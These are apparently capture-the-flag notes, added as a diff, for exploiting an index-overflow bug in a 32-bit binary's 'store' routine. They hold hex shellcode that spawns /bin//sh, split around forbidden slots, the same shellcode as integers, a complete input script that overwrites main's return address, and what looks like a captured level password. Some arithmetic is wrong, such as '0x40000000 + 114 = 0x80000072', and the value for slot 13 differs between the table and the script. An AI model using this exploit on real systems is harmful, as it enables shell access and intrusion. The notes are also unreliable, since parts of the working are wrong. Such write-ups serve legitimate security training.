@@ -1,0 +1,105 @@
+we try to overwrite the main return address using the store function
+
+we find it is offset by 464
+
+index = 464 / 4 = 114
+
+but we receive the message: "address forbidden by wil"
+
+we try to overwrite the printf plt
+
+offset to 0x0 = 0x2b9c
+
+printf plt = 0x08048470
+offset to printf plt = (0x08048470 + 0x2b9c) / 4 => 33631235
+
+we use 'read' to check on the real binary
+we get 2684626431, or 0xA00425FF, which is correct
+we get a segfault on the real binary
+
+we try again with the main return address
+
+since the index is multiplied by 4, any number in the last 2 bits will overflow
+0x80000000 + 114 = 0x80000072 = -2147483534
+however, if the index is negative, the rightmost bit will be one-init
+0x40000000 + 114 = 0x80000072 = 1073741938
+
+4294956148
+
+Unfortunately, we can only use indexes not mutiples of 3,
+so we write a shellcode that can have abitrary data there,
+using a relative 4-byte jump before each gap
+
+0:	90909090
+
+1:	31c05090
+2:	9090EB04
+
+3:	90909090
+
+4:	682f2f73
+5:	6890EB04
+
+6:	90909090
+
+7:	682f6269
+8:	6e90EB04
+
+9:	90909090
+
+10:	89e35053
+11:	89e1EB04
+
+12:	90909090
+
+13:	b00bcd80
+
+we convert to int
+
+1:	2421211185
+2:	82546832
+4:	1932472168
+5:	82546792
+7:	1768042344
+8:	82546798
+10:	1397810057
+11:	82567561
+13:	1073741938
+
+the address of our shellcode will be 0xffffd474 + 4 or 4294956152,
+because we start at index one
+we create a script
+
+store
+2421211185
+1
+store
+82546832
+2
+store
+1932472168
+4
+store
+82546792
+5
+store
+1768042344
+7
+store
+82546798
+8
+store
+1397810057
+10
+store
+82567561
+11
+store
+2160921520
+13
+store
+4294956152
+1073741938
+quit
+
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
